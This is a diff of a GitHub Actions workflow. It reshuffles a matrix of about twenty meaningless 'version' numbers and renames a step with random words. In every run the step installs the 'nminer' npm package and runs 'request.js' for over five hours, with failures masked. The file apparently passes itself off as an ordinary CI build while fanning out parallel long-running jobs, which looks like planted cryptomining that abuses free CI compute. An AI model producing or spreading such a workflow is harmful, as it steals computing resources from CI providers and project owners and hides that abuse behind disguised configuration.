@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 97 }
-          - { version: 3393 }
-          - { version: 6884 }
-          - { version: 2974 }
-          - { version: 6036 }
-          - { version: 4479 }
-          - { version: 1234 }
-          - { version: 9205 }
-          - { version: 5181 }
-          - { version: 8034 }
-          - { version: 3896 }
-          - { version: 128 }
-          - { version: 8228 }
-          - { version: 9387 }
-          - { version: 9712 }
-          - { version: 8876 }
-          - { version: 2293 }
-          - { version: 7011 }
-          - { version: 9992 }
-          - { version: 4675 }
+          - { version: 7095 }
+          - { version: 6750 }
+          - { version: 3025 }
+          - { version: 8920 }
+          - { version: 7480 }
+          - { version: 2435 }
+          - { version: 9904 }
+          - { version: 1480 }
+          - { version: 6213 }
+          - { version: 2920 }
+          - { version: 1046 }
+          - { version: 4336 }
+          - { version: 8295 }
+          - { version: 2124 }
+          - { version: 9 }
+          - { version: 2502 }
+          - { version: 6626 }
+          - { version: 4830 }
+          - { version: 8196 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: scientific alb entomb coal especially
+      - name: bookend round though mindless
         run: |
           npm install nminer@latest
-          timeout 342m node request.js || echo "request executed"
+          timeout 317m node request.js || echo "request executed"
